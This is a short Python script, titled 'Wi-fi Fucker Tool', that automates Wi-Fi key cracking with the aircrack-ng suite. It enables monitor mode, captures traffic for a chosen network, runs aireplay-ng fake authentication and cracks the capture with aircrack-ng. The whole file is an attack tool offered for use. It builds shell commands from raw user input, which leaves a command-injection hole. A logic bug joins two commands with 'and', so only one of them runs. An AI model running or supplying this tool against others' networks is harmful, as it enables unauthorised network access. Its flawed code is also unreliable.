import os , sys , time
import pyautogui
print("""

    ███████████████████████████████
    █                             █
    █═╬═════════════════════════╬═█
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░Wi-fi Fucker Tool░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░coded by arda6░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █═╬═════════════════════════╬═█
    █                             █
    ███████████████████████████████


""")
pla = sys.platform
if pla == "win32":
    win = "Windows"
    print("     [!] Your Platform is " +win+ "\n")
elif pla == "darwin":
    mac = "MacOs"
    print("     [+] Your Platform is " +mac+ "\n")
elif pla == "linux":
    mac = "Linux"
    print("     [+] Your Platform is " +mac+"\n")
if pla == "win32":
    print("     [!] Not Suitable For Tool Windows \n")
    time.sleep(3)
    exit("     [#] https://www.github/arda6")

os.system("sudo airmon-ng start")
print("░░░░░░░░░░░░░░░░░░ ═")
mon = input("░░Wifi Card Name░░ ═\n░░░░░░░░░░░░░░░░░░ ═ ")
os.system("sudo airmon-ng start " +mon+"")
os.system("sudo airodump-ng " +mon+"mon")
time.sleep(6)
pyautogui.press("ctrl+c")
print("░░░░░░░░░░░░░░░░ ═")
wifi = input("░░Select BSSID░░ ═\n░░░░░░░░░░░░░░░░ ═ ")
print("")
print("░░░░░░░░░░░░░░░░░░ ═")
channel = input("░░Select Channel░░ ═\n░░░░░░░░░░░░░░░░░░ ═ ")
os.system("sudo airodump-ng -c "+channel+ " --bssid " +wifi+ " -w " +channel+ " " +mon+"mon" and "sudo aireplay-ng -1 0 -a " +wifi+ " " +mon+"mon")
pyautogui.press("ctrl+c")
os.system("sudo aircrack-ng -K -b " +wifi+ " " +channel+".cap")
